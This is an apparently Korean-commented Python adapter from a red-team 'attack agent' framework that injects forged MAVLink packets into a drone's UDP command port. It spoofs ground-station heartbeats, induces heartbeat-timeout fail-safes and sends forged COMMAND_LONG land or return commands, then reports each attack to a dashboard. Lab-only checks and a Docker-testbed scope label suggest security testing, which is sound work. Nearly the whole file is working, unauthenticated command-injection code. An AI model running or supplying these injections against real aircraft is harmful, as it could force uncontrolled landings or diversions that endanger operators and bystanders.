from __future__ import annotations

import json
import os
import urllib.error
import urllib.request
from typing import Any

from attack_agent.adapters.base import AgentAdapter
from attack_agent.core.config import load_config, map_lab_host
from attack_agent.core.safety import assert_lab_only_action
from attack_agent.core.schemas import AttackStep, IntelDocument


class MavlinkInjectorAdapter(AgentAdapter):
    """계열 A(인증 부재) 실행기 — UAV 명령포트(14551)에 위조 MAVLink 주입.

    A-1 MAVLINK_STATUS_SPOOF   : 위조 GCS heartbeat(system_status) → LOITER/RTL
    A-2 HB_TIMEOUT_INDUCTION   : 위조 heartbeat 후 침묵 → 통신두절 fail-safe
    A-3 MAVLINK_COMMAND_INJECTION : 위조 COMMAND_LONG(LAND 등) 직접 주입 → LANDING
    """

    name = "dah-mavlink-injector"
    SUPPORTED = {
        "MAVLINK_STATUS_SPOOF",
        "HB_TIMEOUT_INDUCTION",
        "MAVLINK_COMMAND_INJECTION",
    }

    def supports(self, step: AttackStep) -> bool:
        return step.agent == self.name or step.action_type in self.SUPPORTED

    def build_command(self, step: AttackStep, intel: IntelDocument) -> dict[str, Any]:
        p = step.params
        host = map_lab_host(p.get("target_host", "dah-uav"))
        return {
            "transport": "mavlink-udp",
            "host": host,
            "port": int(p.get("cmd_port", 14551)),
            "action_type": step.action_type,
            "params": p,
        }

    def execute(self, step: AttackStep, intel: IntelDocument) -> dict[str, Any]:
        cmd = self.build_command(step, intel)
        host, port = cmd["host"], int(cmd["port"])
        assert_lab_only_action(host, port, "udp", execute=True)

        action = step.action_type
        if action == "MAVLINK_COMMAND_INJECTION":
            result = self._inject_command(host, port, step.params)
        elif action == "MAVLINK_STATUS_SPOOF":
            result = self._spoof_status(host, port, step.params)
        elif action == "HB_TIMEOUT_INDUCTION":
            result = self._induce_hb_timeout(host, port, step.params)
        else:
            return {"adapter": self.name, "step_id": step.step_id, "status": "unsupported_action", "action_type": action}

        dashboard_result = self._report_dashboard_event(step, cmd, result)
        return {
            "adapter": self.name,
            "step_id": step.step_id,
            "dry_run": False,
            "target": f"{host}:{port}",
            **result,
            **dashboard_result,
        }

    # ── A-3: 위조 COMMAND_LONG 주입 ────────────────────────────────────
    def _inject_command(self, host: str, port: int, p: dict[str, Any]) -> dict[str, Any]:
        os.environ.setdefault("MAVLINK20", "1")
        from pymavlink import mavutil

        cmd_name = p.get("command", "NAV_LAND")
        cmd_id = getattr(mavutil.mavlink, f"MAV_CMD_{cmd_name}", mavutil.mavlink.MAV_CMD_NAV_LAND)
        src = int(p.get("spoof_src_sys", 99))
        target_sys = int(p.get("target_sys", 1))

        mav = mavutil.mavlink_connection(f"udpout:{host}:{port}", source_system=src)
        mav.mav.command_long_send(
            target_sys, 1, cmd_id, 0,
            0, 0, 0, 0, 0, 0, 0,
        )
        return {
            "injected": "COMMAND_LONG",
            "command": cmd_name,
            "spoof_src_sys": src,
            "target_sys": target_sys,
            "expected_mode": {"NAV_LAND": "LANDING", "NAV_RETURN_TO_LAUNCH": "RTL",
                              "NAV_LOITER_UNLIM": "LOITER", "DO_PAUSE_CONTINUE": "PAUSED"}.get(cmd_name, "MODE_CHANGE"),
        }

    # ── A-1: 위조 GCS heartbeat(system_status) 주입 ────────────────────
    def _spoof_status(self, host: str, port: int, p: dict[str, Any]) -> dict[str, Any]:
        os.environ.setdefault("MAVLINK20", "1")
        from pymavlink import mavutil

        status_name = p.get("system_status", "CRITICAL")
        status_id = getattr(mavutil.mavlink, f"MAV_STATE_{status_name}", mavutil.mavlink.MAV_STATE_CRITICAL)
        src = int(p.get("spoof_src_sys", 255))  # mock_uav는 src==255만 GCS로 신뢰

        mav = mavutil.mavlink_connection(f"udpout:{host}:{port}", source_system=src)
        mav.mav.heartbeat_send(
            mavutil.mavlink.MAV_TYPE_GCS,
            mavutil.mavlink.MAV_AUTOPILOT_INVALID,
            0, 0, status_id,
        )
        return {
            "injected": "HEARTBEAT",
            "system_status": status_name,
            "spoof_src_sys": src,
            "expected_mode": {"CRITICAL": "LOITER", "EMERGENCY": "RTL"}.get(status_name, "MODE_CHANGE"),
        }

    # ── A-2: 위조 heartbeat 1회 후 침묵으로 두절 유도 ──────────────────
    def _induce_hb_timeout(self, host: str, port: int, p: dict[str, Any]) -> dict[str, Any]:
        os.environ.setdefault("MAVLINK20", "1")
        from pymavlink import mavutil

        silence = int(p.get("silence_sec", int(p.get("hb_timeout_sec", 5)) + 2))
        mav = mavutil.mavlink_connection(f"udpout:{host}:{port}", source_system=255)
        # 위장 heartbeat 1회 송신 후 execute 종료 → 이후 무송신(침묵)이 곧 억제
        mav.mav.heartbeat_send(
            mavutil.mavlink.MAV_TYPE_GCS,
            mavutil.mavlink.MAV_AUTOPILOT_INVALID,
            0, 0, mavutil.mavlink.MAV_STATE_ACTIVE,
        )
        return {
            "injected": "HEARTBEAT_THEN_SILENCE",
            "silence_sec": silence,
            "note": f"이후 {silence}s 무송신 유지 시 watchdog 두절 판정 → LOITER",
            "expected_mode": "LOITER",
        }

    # ── 대시보드 증거 이벤트 (스크린샷용) ─────────────────────────────
    def _report_dashboard_event(self, step: AttackStep, cmd: dict[str, Any], result: dict[str, Any]) -> dict[str, Any]:
        config = load_config()
        payload = {
            "message_type": "mavlink_injection_alert",
            "agent_type": self.name,
            "source": "attack_chain",
            "vehicle_id": cmd["params"].get("target_sys", 1) and "UAV-001",
            "severity": "CRITICAL" if step.action_type == "MAVLINK_COMMAND_INJECTION" else "HIGH",
            "status": {
                "MAVLINK_COMMAND_INJECTION": "COMMAND_INJECTED",
                "MAVLINK_STATUS_SPOOF": "GCS_STATUS_SPOOFED",
                "HB_TIMEOUT_INDUCTION": "HB_SUPPRESSED",
            }.get(step.action_type, "MAVLINK_INJECTED"),
            "message": f"UAV-001 MAVLink 무인증 주입 — {step.action_type}",
            "detail": f"{result.get('injected')} → expected={result.get('expected_mode')} src={result.get('spoof_src_sys', 255)}",
            "simulated_only": True,
            "scope": "LOCAL_DOCKER_TESTBED_ONLY",
            "evidence": {
                "step_id": step.step_id,
                "module": step.action_type,
                "target": f"{cmd['host']}:{cmd['port']}",
                **result,
            },
        }
        data = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            f"{config.dashboard_url}/api/agent-event",
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=2) as response:
                body = json.loads(response.read().decode("utf-8"))
            return {"forwarded_alert": True, "dashboard_response": body, "alert": payload}
        except (urllib.error.URLError, TimeoutError, ValueError) as exc:
            return {"forwarded_alert": False, "dashboard_error": str(exc), "alert": payload}
